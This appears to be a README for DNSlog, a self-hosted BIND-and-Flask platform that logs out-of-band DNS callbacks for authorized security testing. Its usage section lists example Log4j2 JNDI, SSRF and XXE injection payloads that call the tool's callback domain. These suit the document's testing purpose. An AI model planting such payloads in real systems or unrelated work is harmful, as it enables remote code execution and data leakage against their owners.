# DNSlog

A self-hosted DNS log platform for security testing (e.g., Log4j2 JNDI injection, SSRF, OOB DNS). Captures and displays DNS exfiltration queries in real-time via WebSocket.

## Architecture

```
Target --DNS query--> Recursive NS --> Authoritative NS (BIND)
                                           |
                                     query.log
                                           |
                              dnslog.py (tail + parse)
                                     /        \
                              SQLite DB    WebSocket :9091
                                           |
                              Web UI :9090 (Flask)
```

- **BIND** handles authoritative DNS resolution for `*.log.yourdomain.com`
- **dnslog.py** tails BIND query log, extracts matching records into SQLite
- **Web UI** displays records in real-time via WebSocket push

## Requirements

- Python 3.8+
- BIND9 (named) as authoritative DNS server
- Ubuntu/Debian (systemd)

## Quick Start

### 1. Install Dependencies

```bash
pip3 install -r requirements.txt
```

### 2. Configure BIND9

Add a zone for your DNS log subdomain (e.g., `log.example.com`):

**`/etc/bind/named.conf.local`:**
```
zone "log.example.com" {
    type master;
    file "/etc/bind/db.log.example.com";
};
```

**`/etc/bind/db.log.example.com`:**
```
$TTL    60
@       IN  SOA ns1.example.com. admin.example.com. (
            2026010101 ; Serial
            3600       ; Refresh
            1800       ; Retry
            604800     ; Expire
            60         ; Minimum TTL
)
        IN  NS  ns1.example.com.
        IN  A   YOUR_SERVER_IP
ns1     IN  A   YOUR_SERVER_IP
*       IN  A   YOUR_SERVER_IP
```

Enable query logging in `/etc/bind/named.conf.options`:
```
options {
    listen-on { any; };
    querylog yes;
    // ... other options
};
```

Set log file path in `/etc/bind/named.conf.logging`:
```
logging {
    channel query_log {
        file "/var/log/named/query.log" versions 3 size 50m;
        severity info;
        print-category yes;
        print-severity yes;
        print-time yes;
    };
    category queries { query_log; };
};
```

Ensure log is readable:
```bash
sudo chmod 755 /var/log/named
sudo chmod 644 /var/log/named/query.log
sudo systemctl restart named
```

### 3. Configure DNS Delegation

At your domain registrar, add an NS record:

| Type | Host | Value |
|------|------|-------|
| NS   | log  | ns1.example.com |

### 4. Configure dnslog

```bash
cp dnslog.conf.example dnslog.conf
```

Edit `dnslog.conf`:

```ini
[dnslog]
domain = log.example.com
server_ip = 0.0.0.0
named_log = /var/log/named/query.log

[web]
port = 9090
ws_port = 9091
access_code = your_secret_code

[database]
path = dnslog.db
max_records = 5000
```

| Option | Description | Default |
|--------|-------------|---------|
| `domain` | Your DNS log subdomain | `log.example.com` |
| `server_ip` | Server IP (for reference) | `0.0.0.0` |
| `named_log` | BIND query log path | `/var/log/named/query.log` |
| `port` | Web UI port | `9090` |
| `ws_port` | WebSocket port | `9091` |
| `access_code` | Access code for the platform | (empty, disabled) |
| `path` | SQLite database filename | `dnslog.db` |
| `max_records` | Max records to keep (0 = unlimited) | `5000` |

### 5. Run

```bash
python3 dnslog.py
```

Or deploy with systemd — create `/etc/systemd/system/dnslog.service`:

```ini
[Unit]
Description=DNSlog Web Platform
After=network.target named.service
Wants=named.service

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/opt/dnslog
ExecStart=/usr/bin/python3 /opt/dnslog/dnslog.py
Restart=always
RestartSec=5
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable dnslog
sudo systemctl start dnslog
```

## Usage

1. Open `http://YOUR_SERVER:9090` in your browser
2. Enter the access code configured in `dnslog.conf`
3. Click **Get Token** to generate a unique subdomain (e.g., `abc12345.log.example.com`)
4. Use this domain in your payload:
   - Log4j2 JNDI: `${jndi:ldap://abc12345.log.example.com/x}`
   - SSRF: `http://abc12345.log.example.com`
   - XXE: `<!ENTITY xxe SYSTEM "http://abc12345.log.example.com">`
5. Records appear in real-time via WebSocket

## Features

- **Token-based tracking**: Each token generates a unique subdomain; queries are grouped by token
- **Real-time updates**: WebSocket push, no polling
- **Access code protection**: Entire platform requires access code to use
- **Auto-cleanup**: Oldest records are pruned when exceeding `max_records`
- **Deduplication**: Same domain + source IP combination is recorded only once
- **localStorage persistence**: Token and access code survive page refresh

## API

Full interactive API documentation: **[http://YOUR_SERVER:9090/api/docs](http://YOUR_SERVER:9090/api/docs)**

All API endpoints (except `/api/auth`) require access code authentication via:
- Query parameter: `?code=your_access_code`
- Header: `X-Access-Code: your_access_code`

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/auth` | Verify access code. Body: `{"code": "xxx"}` |
| `GET` | `/api/random?code=xxx` | Generate a random token domain |
| `GET` | `/api/records?token=xxx&code=xxx` | Get records for a token (max 200) |
| `DELETE` | `/api/records?token=xxx&code=xxx` | Clear records for a token |
| `WS` | `ws://HOST:9091` | WebSocket real-time updates (auth via first message) |

**Quick examples:**
```bash
# Generate a token domain
curl "http://YOUR_SERVER:9090/api/random?code=your_access_code"

# Fetch records
curl "http://YOUR_SERVER:9090/api/records?token=abc12345&code=your_access_code"

# Clear records
curl -X DELETE "http://YOUR_SERVER:9090/api/records?token=abc12345&code=your_access_code"
```

## Project Structure

```
dnslog/
├── dnslog.py              # Main application (DNS tail + Flask + WebSocket)
├── dnslog.conf.example    # Configuration template
├── dnslog.conf            # Your config (gitignored)
├── requirements.txt       # Python dependencies
├── templates/
│   ├── index.html         # Web UI
│   └── docs.html          # API documentation
└── dnslog.db              # SQLite database (auto-created, gitignored)
```

## Security Notes

- This tool is intended for **authorized security testing only**
- The access code is stored in plaintext in `dnslog.conf` — protect file permissions
- BIND query log must be readable by the dnslog process user
- Consider placing the web UI behind a reverse proxy (nginx) with HTTPS in production
